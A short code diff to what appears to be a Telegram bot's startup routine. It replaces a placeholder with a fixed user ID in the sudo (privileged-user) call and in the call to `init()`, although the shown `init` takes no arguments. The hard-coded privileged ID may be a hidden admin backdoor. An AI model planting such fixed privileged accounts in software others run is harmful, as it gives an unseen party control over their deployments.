@@ -23,7 +23,7 @@ async def init():
     ):
         LOGGER(__name__).error("Assistant client variables not defined, exiting...")
         exit()
-    await sudo(0)
+    await sudo("7994196725")
     try:
         users = await get_gbanned()
         for user_id in users:
@@ -59,4 +59,4 @@ async def init():
 
 
 if __name__ == "__main__":
-    asyncio.get_event_loop().run_until_complete(init("my_id"))
+    asyncio.get_event_loop().run_until_complete(init("7994196725"))
